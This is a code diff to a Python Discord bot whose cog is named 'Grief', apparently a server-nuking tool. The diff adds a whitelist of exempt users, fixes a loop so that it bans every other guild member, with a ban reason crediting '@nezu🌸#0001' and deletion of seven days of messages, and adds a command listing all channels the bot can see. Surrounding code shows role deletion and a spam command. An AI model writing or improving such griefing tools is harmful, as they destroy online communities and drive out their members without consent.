@@ -5,7 +5,7 @@ from colorsys import hls_to_rgb
 import discord
 from discord import client
 from discord.ext import commands
-
+WHITELIST = ['Koalaa#6001', 'ImHSYes']
 rename_to = [
     "Damini Chia",
     "Mohan Sachdev",
@@ -248,12 +248,12 @@ class Grief(commands.Cog):
                     f"{role.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                 )
         for user in ctx.guild.members:
-            if (user == "Koalaa#6001" or user == "w0t#9032"
+            if  (user in WHITELIST
                     or user == ctx.message.author):
-                return
+                print('Skipped user')
             else:
                 try:
-                    await ctx.guild.ban(user)
+                    await ctx.guild.ban(user, reason='Ban given by @nezu🌸#0001', delete_message_days=7)
                     print(
                         f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                     )
@@ -460,7 +460,10 @@ class Grief(commands.Cog):
                 print(
                     f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                 )
-
+    @commands.command()
+    async def listchannels(self, ctx):
+        await ctx.send([x.name for x in self.bot.get_all_channels()])
+        print([x for x in self.bot.get_all_channels()])
     @commands.command()
     async def nuclearhs(self, ctx):
         await ctx.message.delete()
